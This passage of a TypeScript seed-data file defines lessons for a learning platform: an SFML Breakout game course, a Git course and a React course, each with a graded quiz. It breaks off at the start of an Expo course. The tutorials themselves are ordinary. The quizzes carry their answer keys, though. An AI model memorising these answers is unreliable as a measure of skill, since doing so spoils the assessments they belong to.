      `Every real-time game runs the same three steps, over and over, dozens of times per second: **handle input, update the world, draw the world**.\n\n## Framerate and deltaTime\n\nIf you move an object by a fixed amount every frame, the game runs faster on powerful computers and slower on weak ones, because faster computers simply produce more frames per second. The fix is **deltaTime**: the actual time elapsed since the last frame, used to scale every movement.\n\n\`\`\`cpp\n#include <SFML/Graphics.hpp>\n\nint main() {\n    sf::RenderWindow window(sf::VideoMode(800, 600), "Breakout");\n    window.setFramerateLimit(60);\n\n    sf::CircleShape shape(20.f);\n    shape.setFillColor(sf::Color::Green);\n\n    float speed = 200.f; // pixels per second\n    sf::Clock clock;\n\n    while (window.isOpen()) {\n        float deltaTime = clock.restart().asSeconds();\n\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n        }\n\n        shape.move(speed * deltaTime, 0.f);\n\n        window.clear(sf::Color::Black);\n        window.draw(shape);\n        window.display();\n    }\n\n    return 0;\n}\n\`\`\`\n\n## The pieces\n\n- \`window.setFramerateLimit(60)\` caps the loop at roughly 60 frames per second, so it doesn't burn 100% CPU rendering thousands of frames nobody sees.\n- \`sf::Clock clock\` starts a stopwatch. \`clock.restart()\` returns the elapsed time since the last restart **and** resets it, so calling it once per frame gives you exactly that frame's duration.\n- \`speed * deltaTime\` means "how far should this move, given it travels at \`speed\` pixels per second and this frame took \`deltaTime\` seconds", this keeps motion smooth and consistent regardless of framerate.\n- \`window.draw(shape)\` queues the shape to be drawn, it isn't actually shown until \`window.display()\`.\n\n> [!WARNING]\n> Moving objects by a flat number of pixels per frame (instead of \`speed * deltaTime\`) is a classic bug, the game will play at wildly different speeds on different hardware.`
    ),
    quiz: {
      title: 'Game Loop Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should movement be multiplied by deltaTime instead of using a fixed step per frame?',
          options: [
            'It makes the code shorter',
            'It keeps movement speed consistent regardless of framerate',
            'SFML requires it to compile',
            'It reduces memory usage',
          ],
          answer: 'It keeps movement speed consistent regardless of framerate',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The SFML class used as a stopwatch to measure elapsed time between frames is sf::____.',
          options: [],
          answer: 'Clock',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'window.draw() immediately shows the shape on screen, before window.display() is called.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'The Paddle',
    content: lessonContent(
      'The Paddle',
      `Wrap the paddle's shape, position, and behavior into a \`class\`, this keeps every piece of paddle logic in one place instead of scattered loose variables.\n\n\`\`\`cpp\nclass Paddle {\npublic:\n    Paddle(float x, float y) {\n        shape.setSize(sf::Vector2f(100.f, 15.f));\n        shape.setFillColor(sf::Color::White);\n        shape.setPosition(x, y);\n    }\n\n    void update(float deltaTime, float windowWidth) {\n        float dx = 0.f;\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left)) {\n            dx = -speed * deltaTime;\n        }\n        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Right)) {\n            dx = speed * deltaTime;\n        }\n\n        shape.move(dx, 0.f);\n\n        // Clamp to the window so the paddle can't slide off-screen\n        sf::Vector2f pos = shape.getPosition();\n        float width = shape.getSize().x;\n        if (pos.x < 0.f) shape.setPosition(0.f, pos.y);\n        if (pos.x + width > windowWidth) shape.setPosition(windowWidth - width, pos.y);\n    }\n\n    void draw(sf::RenderWindow& window) {\n        window.draw(shape);\n    }\n\n    sf::RectangleShape shape;\n\nprivate:\n    float speed = 400.f;\n};\n\`\`\`\n\n## The pieces\n\n- \`sf::Keyboard::isKeyPressed(...)\` checks the **current** state of a key, unlike \`sf::Event\`, it doesn't wait for a press event, which is exactly what you want for smooth, continuous movement.\n- Clamping reads the paddle's current position and size, then snaps it back inside \`[0, windowWidth]\` if it would otherwise cross an edge.\n- \`void draw(sf::RenderWindow& window)\` takes the window **by reference**, so the class can draw itself without copying the whole window object.\n\n> [!TIP]\n> Passing \`sf::RenderWindow&\` (a reference) instead of \`sf::RenderWindow\` (a copy) matters here, \`sf::RenderWindow\` isn't copyable at all, and even if it were, copying an entire window every frame would be wasteful.`
    ),
    quiz: {
      title: 'Paddle Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why use sf::Keyboard::isKeyPressed() instead of sf::Event for paddle movement?',
          options: [
            'It checks the key\'s current state, giving smooth continuous movement',
            'It is the only way to read the Left and Right keys',
            'sf::Event cannot detect keyboard input at all',
            'It runs faster than every other input method',
          ],
          answer: 'It checks the key\'s current state, giving smooth continuous movement',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Clamping the paddle position prevents it from moving off the edges of the window.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'The Ball',
    content: lessonContent(
      'The Ball',
      `The ball needs a position, a shape, and a **velocity**, how fast and in what direction it's moving on each axis.\n\n\`\`\`cpp\nclass Ball {\npublic:\n    Ball(float x, float y) {\n        shape.setRadius(10.f);\n        shape.setFillColor(sf::Color::Red);\n        shape.setPosition(x, y);\n    }\n\n    void update(float deltaTime, float windowWidth) {\n        shape.move(velocity.x * deltaTime, velocity.y * deltaTime);\n\n        sf::Vector2f pos = shape.getPosition();\n        float radius = shape.getRadius();\n\n        // Bounce off the left and right walls\n        if (pos.x <= 0.f || pos.x + radius * 2 >= windowWidth) {\n            velocity.x = -velocity.x;\n        }\n\n        // Bounce off the ceiling\n        if (pos.y <= 0.f) {\n            velocity.y = -velocity.y;\n        }\n    }\n\n    void draw(sf::RenderWindow& window) {\n        window.draw(shape);\n    }\n\n    sf::CircleShape shape;\n    sf::Vector2f velocity = sf::Vector2f(200.f, -200.f);\n};\n\`\`\`\n\n## The pieces\n\n- \`sf::Vector2f velocity\` stores an (x, y) pair of floats, positive \`x\` moves right, negative moves left, positive \`y\` moves **down** (SFML's y-axis grows downward, unlike math class), negative moves up.\n- Bouncing is just **flipping the sign** of the relevant component, hit a side wall, invert \`velocity.x\`, hit the ceiling, invert \`velocity.y\`.\n- Notice there's no floor bounce yet, when the ball passes below the paddle, that's a "miss", handled in the Score and Lives lesson, not treated like a wall.\n\n> [!TIP]\n> \`shape.getPosition()\` on an \`sf::CircleShape\` returns the **top-left corner of its bounding box**, not the center, that's why the right-wall check adds \`radius * 2\` (the shape's full width) instead of just \`radius\`.`
    ),
    quiz: {
      title: 'Ball Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'To make the ball bounce off a wall, you flip the sign of its ____.x or .y velocity component.',
          options: [],
          answer: 'velocity',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In SFML's coordinate system, which direction does increasing y move a shape?",
          options: ['Up', 'Down', 'Left', 'Right'],
          answer: 'Down',
        },
      ],
    },
  },
  {
    title: 'Bricks and Collisions',
    content: lessonContent(
      'Bricks and Collisions',
      `A Breakout level is just a grid of rectangles. Build it once at startup, then remove bricks as the ball destroys them.\n\n## Laying out the grid\n\n\`\`\`cpp\n#include <vector>\n\nstd::vector<sf::RectangleShape> createBricks(int rows, int cols) {\n    std::vector<sf::RectangleShape> bricks;\n    float brickWidth = 75.f;\n    float brickHeight = 20.f;\n    float padding = 5.f;\n\n    for (int row = 0; row < rows; row++) {\n        for (int col = 0; col < cols; col++) {\n            sf::RectangleShape brick(sf::Vector2f(brickWidth, brickHeight));\n            brick.setPosition(\n                col * (brickWidth + padding) + 35.f,\n                row * (brickHeight + padding) + 50.f\n            );\n            brick.setFillColor(sf::Color::Cyan);\n            bricks.push_back(brick);\n        }\n    }\n    return bricks;\n}\n\`\`\`\n\n## Detecting collisions\n\nEvery drawable shape has \`getGlobalBounds()\`, an \`sf::FloatRect\` describing its bounding box in the window, and every \`sf::FloatRect\` has \`.intersects(other)\` to test overlap:\n\n\`\`\`cpp\nfor (std::size_t i = 0; i < bricks.size(); i++) {\n    if (ball.shape.getGlobalBounds().intersects(bricks[i].getGlobalBounds())) {\n        ball.velocity.y = -ball.velocity.y; // simplified bounce\n        bricks.erase(bricks.begin() + i);\n        score += 10;\n        break; // only handle one collision per frame\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`getGlobalBounds()\` returns the shape's bounding box **after** any position, rotation, or scale is applied, use this (not raw size) for collision checks.\n- \`.intersects(other)\` returns \`true\` if the two rectangles overlap at all.\n- \`bricks.erase(bricks.begin() + i)\` removes the destroyed brick from the vector, shifting later elements down. Once a collision is handled, \`break\` out of the loop, the indices are no longer valid after an erase.\n- Flipping \`velocity.y\` on every brick hit is a simplification, real Breakout clones check which **side** of the brick was hit to decide whether to flip \`x\` or \`y\`. That's a great stretch goal for the final project.\n\n> [!WARNING]\n> Erasing from a \`std::vector\` while iterating it with a range-based \`for\` loop (\`for (auto& brick : bricks)\`) invalidates the iterator and causes undefined behavior. Use an index-based loop with \`break\`, like above, whenever the loop body might erase.`
    ),
    quiz: {
      title: 'Bricks & Collisions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method checks whether two sf::FloatRect bounding boxes overlap?',
          options: ['.overlaps()', '.intersects()', '.collides()', '.touches()'],
          answer: '.intersects()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'It is safe to erase elements from a std::vector while iterating it with a range-based for loop.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The method that returns a shape's bounding box after position and scale are applied is get____Bounds().",
          options: [],
          answer: 'Global',
        },
      ],
    },
  },
  {
    title: 'Score, Lives, and Game Over',
    content: lessonContent(
      'Score, Lives, and Game Over',
      `A playable game needs feedback: a visible score, a limited number of lives, and a clear end condition.\n\n## Drawing text\n\n\`\`\`cpp\nsf::Font font;\nif (!font.loadFromFile("arial.ttf")) {\n    // handle missing font file\n}\n\nsf::Text scoreText;\nscoreText.setFont(font);\nscoreText.setCharacterSize(20);\nscoreText.setFillColor(sf::Color::White);\nscoreText.setPosition(10.f, 10.f);\n\n// Each frame:\nscoreText.setString("Score: " + std::to_string(score) + "  Lives: " + std::to_string(lives));\nwindow.draw(scoreText);\n\`\`\`\n\n## Losing a life\n\nWhen the ball's position goes past the bottom edge, it's a miss, not a wall bounce:\n\n\`\`\`cpp\nif (ball.shape.getPosition().y > windowHeight) {\n    lives--;\n\n    if (lives <= 0) {\n        gameOver = true;\n    } else {\n        // Reset the ball above the paddle to keep playing\n        ball.shape.setPosition(windowWidth / 2.f, windowHeight / 2.f);\n        ball.velocity = sf::Vector2f(200.f, -200.f);\n    }\n}\n\`\`\`\n\n## Winning\n\n\`\`\`cpp\nif (bricks.empty()) {\n    won = true;\n}\n\`\`\`\n\n## The pieces\n\n- \`sf::Font\` and \`sf::Text\` need a real \`.ttf\` file, on Linux \`/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf\` usually exists, on other platforms bundle a font file with your project.\n- \`std::to_string(score)\` converts a number to a \`std::string\` so it can be concatenated with \`+\` onto other strings.\n- Losing a life resets the ball instead of ending the game immediately, the game should only end once \`lives\` reaches \`0\`.\n- Checking \`bricks.empty()\` is a clean win condition, once every brick is destroyed, the vector naturally has no elements left.\n\n> [!TIP]\n> Once \`gameOver\` or \`won\` is \`true\`, stop calling \`ball.update()\` and \`paddle.update()\` (but keep the event loop and \`window.display()\` running), otherwise the ball keeps bouncing behind your "GAME OVER" text.`
    ),
    quiz: {
      title: 'Score & Game Over Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What should happen when the ball passes below the paddle and lives remain?',
          options: [
            'The game ends immediately',
            'A life is lost and the ball resets so play continues',
            'The score resets to zero',
            'The bricks respawn',
          ],
          answer: 'A life is lost and the ball resets so play continues',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The function used to convert a number into a std::string for display is std::____().',
          options: [],
          answer: 'to_string',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Checking bricks.empty() is a reasonable way to detect that the player has won.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Finish Your Breakout Game',
    content: lessonContent(
      'Final Project: Finish Your Breakout Game',
      `You now have every piece: a paddle that responds to input, a ball that bounces off walls, a grid of bricks that break on contact, and score/lives tracking. Put it all together into a complete, playable game.\n\n## Requirements\n\n1. Combine the \`Paddle\`, \`Ball\`, and brick grid from earlier lessons into a single game with one game loop running at a consistent framerate (use \`window.setFramerateLimit(60)\` and deltaTime).\n2. Display the current score and remaining lives on screen every frame.\n3. When the ball passes below the paddle, lose a life and reset the ball above the paddle instead of ending immediately, only show "GAME OVER" once lives reach \`0\`.\n4. Show "YOU WIN" once every brick has been destroyed.\n5. Add a simple start screen ("Press SPACE to start") shown before the game loop begins updating gameplay.\n\n## Stretch goals\n\n- Replace the simplified brick bounce (always flipping \`velocity.y\`) with proper side detection, compare the ball's previous position to the brick's edges to decide whether to flip \`x\` or \`y\`.\n- Make the paddle bounce affect the ball's angle based on **where** it hit the paddle (center vs. edge), instead of a fixed reflection.\n- Give brick rows different colors and point values, and add a basic sound effect for brick breaks with \`sf::SoundBuffer\`/\`sf::Sound\`.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const gitLessons: SeedLesson[] = [
  {
    title: 'Introduction to Git',
    content: lessonContent(
      'Introduction to Git',
      `Git is a **distributed version control system**, it tracks every change to your code over time, lets you go back to any previous state, and makes it possible for multiple people to work on the same project without stepping on each other's changes.\n\n## Why use version control?\n\n- **History**, every commit is a snapshot you can return to.\n- **Branching**, try risky changes on a separate line of work without touching the working code.\n- **Collaboration**, merge everyone's work together instead of emailing zip files around.\n\n## Installing Git and setting your identity\n\nCheck whether Git is already installed:\n\n\`\`\`bash\ngit --version\n\`\`\`\n\nEvery commit is stamped with an author, so set your identity once per machine:\n\n\`\`\`bash\ngit config --global user.name "Your Name"\ngit config --global user.email "you@example.com"\n\`\`\`\n\n\`--global\` applies these settings to every repository on your machine, not just the current one.`
    ),
    quiz: {
      title: 'Git Basics',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What type of software is Git?',
          options: ['A programming language', 'A distributed version control system', 'A cloud hosting service', 'A text editor'],
          answer: 'A distributed version control system',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Git and GitHub are the same thing.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to set your Git username globally is: git config --global user.____',
          options: [],
          answer: 'name',
        },
      ],
    },
  },
  {
    title: 'Your First Repository',
    content: lessonContent(
      'Your First Repository',
      `A Git **repository** ("repo") is a project folder Git is tracking. Let's create one.\n\n## Initializing a repository\n\n\`\`\`bash\nmkdir my-project\ncd my-project\ngit init\n\`\`\`\n\n\`git init\` creates a hidden \`.git\` folder, that's where Git stores the entire history of your project.\n\n## The three states of a file\n\n| State | Meaning |\n|-------|---------|\n| Untracked / Modified | Changed on disk, not yet staged |\n| Staged | Marked to be included in the next commit |\n| Committed | Saved permanently in the project's history |\n\n\`\`\`bash\ngit status                   # see what's changed\ngit add app.js                # stage a specific file\ngit add .                     # stage everything\ngit commit -m "Add app.js"    # save the staged changes\n\`\`\`\n\n## Viewing history\n\n\`\`\`bash\ngit log\ngit log --oneline    # one line per commit, easier to scan\n\`\`\`\n\n> [!TIP]\n> Commit often, in small, focused chunks. "Add login form" is a much more useful commit message than "stuff".`
    ),
    quiz: {
      title: 'First Repository Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command turns a folder into a Git repository?',
          options: ['git start', 'git init', 'git create', 'git new'],
          answer: 'git init',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command moves changes into the staging area?',
          options: ['git stage', 'git add', 'git track', 'git save'],
          answer: 'git add',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "git commit saves your staged changes to the project's permanent history.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Branching and Merging',
    content: lessonContent(
      'Branching and Merging',
      `A **branch** is an independent line of development. The default branch is usually called \`main\`.\n\n## Creating and switching branches\n\n\`\`\`bash\ngit branch feature-login        # create a branch\ngit switch feature-login         # switch to it\n\n# or do both in one step:\ngit switch -c feature-login\n\`\`\`\n\nOlder tutorials use \`git checkout -b feature-login\`, it does the same thing as \`git switch -c\`.\n\n## Merging\n\nOnce your branch is ready, merge it back into \`main\`:\n\n\`\`\`bash\ngit switch main\ngit merge feature-login\n\`\`\`\n\n## Merge conflicts\n\nIf the same lines were changed on both branches, Git can't automatically decide which version to keep, that's a **merge conflict**. Git marks the conflicting lines directly in the file:\n\n\`\`\`\n<<<<<<< HEAD\nconst greeting = "Hello!";\n=======\nconst greeting = "Hi there!";\n>>>>>>> feature-login\n\`\`\`\n\nEdit the file to keep the version you want, remove the \`<<<<<<<\`/\`=======\`/\`>>>>>>>\` markers, then stage and commit as usual.\n\n> [!WARNING]\n> Always pull the latest changes before starting new work, resolving a conflict is much easier when it's small.`
    ),
    quiz: {
      title: 'Branching Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command creates and switches to a new branch in one step?',
          options: ['git branch new', 'git switch -c new', 'git merge new', 'git commit new'],
          answer: 'git switch -c new',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Combining changes from one branch into another is called a ____.',
          options: [],
          answer: 'merge',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A merge conflict happens when Git can automatically combine changes without any help.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Remotes: Push, Pull, and Clone',
    content: lessonContent(
      'Remotes: Push, Pull, and Clone',
      `So far everything has lived only on your machine. A **remote** is a copy of your repository hosted somewhere else, usually GitHub, GitLab, or Bitbucket.\n\n## Connecting a remote\n\nCreate an empty repository on GitHub, then connect it to your local project:\n\n\`\`\`bash\ngit remote add origin https://github.com/you/my-project.git\ngit push -u origin main\n\`\`\`\n\n\`-u\` (short for \`--set-upstream\`) links your local \`main\` branch to \`origin/main\`, so future pushes only need:\n\n\`\`\`bash\ngit push\n\`\`\`\n\n## Getting changes from a remote\n\n\`\`\`bash\ngit pull     # fetch + merge in one step\ngit fetch    # download changes without merging yet\n\`\`\`\n\n## Cloning an existing project\n\nTo get a full copy of someone else's repository:\n\n\`\`\`bash\ngit clone https://github.com/them/their-project.git\n\`\`\`\n\n> [!NOTE]\n> \`origin\` is just a nickname, the default one Git suggests, but you can name a remote anything.`
    ),
    quiz: {
      title: 'Remotes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command uploads your local commits to a remote repository?',
          options: ['git push', 'git pull', 'git fetch', 'git clone'],
          answer: 'git push',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command downloads a full copy of an existing remote repository?',
          options: ['git pull', 'git clone', 'git init', 'git remote'],
          answer: 'git clone',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The default name Git suggests for your primary remote is ____.',
          options: [],
          answer: 'origin',
        },
      ],
    },
  },
  {
    title: 'Final Project: Publish Your Own Repo',
    content: lessonContent(
      'Final Project: Publish Your Own Repo',
      `Time to put it all together.\n\n## Requirements\n\n1. Create a new project folder locally, anything you like, a script, a small app, whatever you want to practice on.\n2. Run \`git init\` and make at least 3 separate commits as you build it.\n3. Create a new empty repository on GitHub (or GitLab/Bitbucket).\n4. Connect your local repo to it and push your commits.\n5. Create at least one additional branch, make a change on it, and merge it back into \`main\`.\n\n## Stretch goals\n\n- Add a \`.gitignore\` file for files that shouldn't be tracked (e.g. \`node_modules/\`).\n- Write a proper \`README.md\` describing your project.\n- Open a pull request on your own repo and merge it from the GitHub UI instead of the command line.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const reactLessons: SeedLesson[] = [
  {
    title: 'Introduction to React and JSX',
    content: lessonContent(
      'Introduction to React and JSX',
      `React is a JavaScript library for building user interfaces out of small, reusable **components**. Instead of manually updating the page, you describe what the UI should look like for a given state, and React handles the updates.\n\n## Your first component\n\nA component is just a JavaScript function that returns **JSX**, an HTML-like syntax that compiles down to regular JavaScript.\n\n\`\`\`\nfunction Welcome() {\n  return <h1>Hello, Kodstigen!</h1>;\n}\n\`\`\`\n\n*JSX needs a React app (and a build step) to render, so it's read-only here, every example in this course uses this style, you'll run real components in the final project.*\n\n## Embedding JavaScript in JSX\n\nCurly braces \`{ }\` let you drop any JavaScript expression into your markup:\n\n\`\`\`\nfunction Greeting() {\n  const name = 'Ada';\n  return <h1>Hello, {name}!</h1>;\n}\n\`\`\`\n\n## One rule to remember\n\nA component must return a **single root element**. To return multiple sibling elements without adding an extra \`<div>\`, wrap them in a Fragment: \`<>...</>\`.`
    ),
    quiz: {
      title: 'React Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does JSX let you write directly inside JavaScript?',
          options: ['SQL queries', 'HTML-like markup', 'CSS stylesheets', 'YAML config'],
          answer: 'HTML-like markup',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A React component is just a JavaScript ____ that returns JSX.',
          options: [],
          answer: 'function',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A component can return multiple sibling elements without wrapping them in a single parent element or Fragment.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Props and Component Composition',
    content: lessonContent(
      'Props and Component Composition',
      `**Props** (short for properties) are how a parent component passes data down to a child component, they work a lot like function arguments.\n\n\`\`\`\nfunction Badge({ label, color }) {\n  return <span style={{ color }}>{label}</span>;\n}\n\nfunction Profile() {\n  return (\n    <div>\n      <Badge label="Instructor" color="blue" />\n      <Badge label="5-star" color="gold" />\n    </div>\n  );\n}\n\`\`\`\n\n## Key rules\n\n- Props are **read-only**, a component should never modify the props it receives, if it needs to change over time, that's what state (next lesson) is for.\n- Destructuring props in the function signature, \`function Badge({ label, color })\`, is the idiomatic way to read them.\n- The special \`children\` prop holds whatever JSX is nested between a component's opening and closing tags, letting you build flexible wrapper components like \`<Card>...</Card>\`.\n\n**Composition** is the practice of building complex UIs out of small components like \`Badge\`, plugged into bigger ones like \`Profile\`.`
    ),
    quiz: {
      title: 'Props Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does a parent component pass data down to a child component?',
          options: ['Global variables', 'Via props', 'Direct DOM manipulation', 'Environment variables'],
          answer: 'Via props',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A component is allowed to modify (mutate) the props it receives.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The special prop that holds JSX nested between a component's opening and closing tags is called ____.",
          options: [],
          answer: 'children',
        },
      ],
    },
  },
  {
    title: 'State and Event Handling',
    content: lessonContent(
      'State and Event Handling',
      `Props let data flow in from a parent, **state** lets a component remember and update its own data over time. The \`useState\` hook is how you add state to a function component.\n\n\`\`\`\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  return (\n    <button onClick={() => setCount(count + 1)}>\n      Clicked {count} times\n    </button>\n  );\n}\n\`\`\`\n\n## How it works\n\n- \`useState(0)\` returns a pair, the **current value** (\`count\`) and a **setter function** (\`setCount\`), starting at \`0\`.\n- Calling \`setCount(...)\` tells React the value changed, React then **re-renders** the component with the new value.\n- \`onClick={() => setCount(count + 1)}\` attaches an event handler, the same pattern works for \`onChange\`, \`onSubmit\`, and every other DOM event.\n\n> [!WARNING]\n> Never mutate state directly (\`count++\` or \`count = count + 1\`), always go through the setter, or React won't know to re-render.`
    ),
    quiz: {
      title: 'State Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does useState(0) return?',
          options: [
            'Just the current value',
            'An array with the current value and a setter function',
            'A Promise that resolves to the value',
            'Nothing, it only has a side effect',
          ],
          answer: 'An array with the current value and a setter function',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Calling the setter function returned by useState triggers a component ____.',
          options: [],
          answer: 're-render',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You should mutate a state variable directly instead of calling its setter function.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Effects and Side Effects',
    content: lessonContent(
      'Effects and Side Effects',
      `Rendering should stay pure, no fetching, no timers, no subscriptions. The \`useEffect\` hook is where that kind of **side effect** belongs.\n\n\`\`\`\nimport { useState, useEffect } from 'react';\n\nfunction CourseList() {\n  const [courses, setCourses] = useState([]);\n\n  useEffect(() => {\n    fetch('/api/courses')\n      .then((res) => res.json())\n      .then(setCourses);\n  }, []); // empty array: run once, when the component mounts\n\n  return (\n    <ul>\n      {courses.map((c) => <li key={c.id}>{c.title}</li>)}\n    </ul>\n  );\n}\n\`\`\`\n\n## The dependency array\n\nThe second argument to \`useEffect\` controls **when** it re-runs:\n\n| Dependency array | Behavior |\n|---|---|\n| omitted | Runs after every render |\n| \`[]\` | Runs once, after the first render |\n| \`[someValue]\` | Runs once after the first render, then again whenever \`someValue\` changes |\n\n## Cleaning up\n\nIf your effect subscribes to something (a timer, a WebSocket, an event listener), return a **cleanup function** from it, React calls it before the effect re-runs and when the component unmounts:\n\n\`\`\`\nuseEffect(() => {\n  const id = setInterval(() => console.log('tick'), 1000);\n  return () => clearInterval(id);\n}, []);\n\`\`\``
    ),
    quiz: {
      title: 'Effects Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an empty dependency array `[]` mean for useEffect?',
          options: [
            'The effect never runs',
            'The effect runs once, when the component mounts',
            'The effect runs on every render',
            'The effect only runs on unmount',
          ],
          answer: 'The effect runs once, when the component mounts',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To fetch data when a component first renders, you would use the ____ hook.',
          options: [],
          answer: 'useEffect',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A function returned from inside useEffect is used to clean up before the next run or on unmount.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Rendering Lists and Building Forms',
    content: lessonContent(
      'Rendering Lists and Building Forms',
      `## Rendering lists\n\nUse \`.map()\` to turn an array of data into an array of JSX elements, each one needs a unique \`key\` prop so React can track it across re-renders.\n\n\`\`\`\nfunction TaskList({ tasks }) {\n  return (\n    <ul>\n      {tasks.map((task) => (\n        <li key={task.id}>{task.text}</li>\n      ))}\n    </ul>\n  );\n}\n\`\`\`\n\n> [!WARNING]\n> Prefer a stable id for \`key\`, using the array index breaks when items are reordered, inserted, or removed, React can confuse which item is which.\n\n## Controlled forms\n\nA **controlled input** gets its displayed value from state, and updates that state on every keystroke:\n\n\`\`\`\nfunction TaskForm({ onAdd }) {\n  const [text, setText] = useState('');\n\n  function handleSubmit(event) {\n    event.preventDefault();\n    onAdd(text);\n    setText('');\n  }\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input value={text} onChange={(e) => setText(e.target.value)} />\n      <button type="submit">Add</button>\n    </form>\n  );\n}\n\`\`\`\n\n\`event.preventDefault()\` stops the browser's default full-page reload on form submit, letting React handle it instead.`
    ),
    quiz: {
      title: 'Lists & Forms Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In a controlled input, what determines the input's displayed value?",
          options: ['The DOM, directly', 'A state variable', 'The HTML value attribute alone', 'Nothing, it is uncontrolled by default'],
          answer: 'A state variable',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'When rendering a list with .map(), each element needs a unique ____ prop.',
          options: [],
          answer: 'key',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using the array index as a key is always safe, even when items can be reordered or removed.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Task Board',
    content: lessonContent(
      'Final Project: Build a Task Board',
      `Time to combine components, props, state, effects, and forms into a real React app.\n\n## Requirements\n\n1. Render a list of tasks (\`{ id, text, done }\`) using \`.map()\` with a proper, stable \`key\`.\n2. Let the user add a new task through a controlled form input.\n3. Let the user toggle a task's done state and delete a task, updating state immutably (no direct mutation of the array or its objects).\n4. Fetch an initial list of tasks from an API (or a mock async function) inside \`useEffect\` when the board first mounts.\n5. Split the UI into at least three components, e.g. \`TaskBoard\`, \`TaskForm\`, and \`TaskItem\`, that communicate through props.\n\n## Stretch goals\n\n- Persist tasks to \`localStorage\` so they survive a page reload.\n- Add filter buttons for All / Active / Completed.\n- Show a loading state while the initial fetch is in flight.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const expoLessons: SeedLesson[] = [
  {
    title: 'Why Expo? Setup and Your First App',
    content: lessonContent(
      'Why Expo? Setup and Your First App',
